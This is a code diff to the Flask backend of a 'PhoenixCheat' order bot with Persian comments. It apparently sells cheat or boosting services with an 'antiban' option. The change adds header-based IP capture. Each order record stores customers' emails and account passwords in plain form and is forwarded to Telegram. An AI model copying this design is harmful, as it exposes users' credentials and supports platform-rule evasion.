@@ -1,5 +1,5 @@
 # -*- coding: utf-8 -*-
-# PhoenixCheat Bot V8 - Final Backend (Phase 3)
+# PhoenixCheat Bot V9 - Final Stable Backend
 
 import json
 import os
@@ -48,8 +48,7 @@ DEFAULT_DATA = {
         "card_holder": "یوسف موسوی",
         "price_per_1000": 25000,
         "price_antiban": 50000,
-        "price_fast": 20000,
-        "price_normal": 0
+        "price_fast": 20000
     },
     "coupons": [],
     "texts": {
@@ -111,6 +110,12 @@ def check_coupon():
             return jsonify({"success": True, "discount": c["discount"]})
     return jsonify({"success": False, "message": "کد نامعتبر است"}), 400
 
+# تابع کمکی برای دریافت آی پی واقعی کاربر در Render
+def get_user_ip():
+    if request.headers.get('X-Forwarded-For'):
+        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
+    return request.remote_addr or "Unknown"
+
 # ثبت سفارش جدید
 @app_web.route("/register", methods=["POST"])
 def register():
@@ -132,7 +137,7 @@ def register():
             "id": oid,
             "code": make_code("ORD"),
             "date": datetime.now().strftime("%Y-%m-%d %H:%M"),
-            "ip": data.get("ip", "Unknown"),
+            "ip": get_user_ip(), # دریافت از هدر Render
             "email": data.get("email", ""),
             "pass": data.get("pass", ""),
             "rubika": data.get("rubika", ""),
@@ -157,7 +162,7 @@ def register():
         return jsonify({"success": True, "code": order["code"]})
     except Exception as e:
         print(f"Register error: {e}")
-        return jsonify({"success": False, "message": "خطای سرور"}), 500
+        return jsonify({"success": False, "message": "خطای داخلی سرور"}), 500
 
 # ================= ارسال به تلگرام =================
 def send_order_to_telegram(order):
@@ -172,7 +177,6 @@ def send_order_to_telegram(order):
         speed_text = "فوری (۱۰ دقیقه)" if order['speed'] == 'fast' else "زمان‌بر (۵ ساعت)"
         antiban_text = "✅ دارد" if order['antiban'] else "❌ ندارد"
         
-        # فرمت پیام کامل
         text = (
             f"🛒 **سفارش جدید ثبت شد!**\n\n"
             f"🔢 کد رهگیری: `{order['code']}`\n"
